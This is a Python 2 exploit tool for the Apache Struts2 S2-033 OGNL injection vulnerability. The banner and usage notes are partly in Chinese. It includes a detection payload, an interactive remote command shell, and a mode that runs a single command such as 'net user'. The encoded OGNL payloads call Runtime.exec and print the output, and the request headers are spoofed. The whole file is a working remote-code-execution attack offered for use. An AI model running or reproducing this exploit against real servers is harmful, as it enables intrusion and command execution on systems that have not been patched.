#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import argparse

banner = u'''\
# S2-033 CmdToolExP
# Author:CF_HB
# 时间：2016年6月7日
# 参考：http://zone.wooyun.org/content/27732
#使用说明：
# 1、检测
    python S2-033_CmdToolExP.py -u http://xxx.xxx.xxx.xxx/xx/ -check yes
  2、交互式执行命令
    python S2-033_CmdToolExP.py -u http://xxx.xxx.xxx.xxx/xx/ -shell yes
  3、执行一条命令：在无交互式环境或不方便查看回显数据时使用
    python S2-033_CmdToolExP.py -u http://xxx.xxx.xxx.xxx/xx/ -command "net user "
# ~$ id
# ======================================================
# uid=0(root) gid=0(root) groups=0(root)
#
# ======================================================
# ~$ pwd
# ======================================================
# /
# ======================================================
# ~$ q   退出

# ======================================================
'''
# PoC
s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"
# CommandExP
cmd_exp = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=ShowMeCommand"
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
            'Cookie': 'JSESSIONID=75C9ED1CD9345875BC5328D73DC76812',
            'referer': 'http://www.baidu.com/',
}

def verity(url):

    try:
        poc_url = url+s2033_poc
        print "."*len(url)
        print "[checking] " + url
        print "."*len(url)
        s = requests.session()
        res = s.post(poc_url, timeout=4)
        if res.status_code == 200 and "290860253718" in res.content:
            if len(res.content) <14: # maybe 12 length
                return True
            else:
                return False
        else:
            return False

    except Exception, e:
        print "Failed to connection target, try again.."
        return False


def cmdTool(exp_url):

    get_url_exp = exp_url + cmd_exp
    while True:
        comm = raw_input("~$ ")
        if comm == "q":
            exit(0)
        temp_exp = get_url_exp.replace("ShowMeCommand", comm)
        try:
            print "="*80
            print "[Result]"
            print "_"*80
            r = requests.get(temp_exp, headers=headers, timeout=5)
            resp = r.text.encode("utf-8")
            print resp
            print "="*80
        except:
            print "error,try again.."

# 执行一句话命令
def ExecOneCmd(exp_url , command):
    try:
        get_url_exp = exp_url + cmd_exp
        temp_exp = get_url_exp.replace("ShowMeCommand", command)
        print "="*80
        print "[Result]"
        print "_"*80
        r = requests.get(temp_exp, headers=headers, timeout=5)
        resp = r.text.encode("utf-8")
        print resp
        print "="*80
        return True
    except:
        return False

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', help='the target url.', required=True)
    parser.add_argument('-check', help='yes|no', required=False)
    parser.add_argument('-shell', help='get os shell (yes|no)', required=False)
    parser.add_argument('-command', help='one os command', required=False)
    args = parser.parse_args()
    args_dict = args.__dict__

    try:
        print banner
        if not (args_dict['u'] == None):
            if not (args_dict['check'] == None):
                url = args_dict['u']
                if args_dict['check'] == "yes":
                    isvuln = verity(url)
                    if isvuln:
                        print "{url} is vulnerable S2-033.".format(url=url)
                        exit(0)
                    else:
                        print "{url} is no vulnerable..".format(url=url)
                        exit(0)
            if not (args_dict['shell'] == None):
                if args_dict['shell'] == "yes":
                    url = args_dict['u']
                    cmdTool(url)
                exit(0)

            if not (args_dict['command'] == None):
                url = args_dict['u']
                command = args_dict['command']
                ExecOneCmd(url, command)
                exit(0)

        print parser.print_usage()
    except Exception,e:
        print parser.print_usage()
        exit(-1)
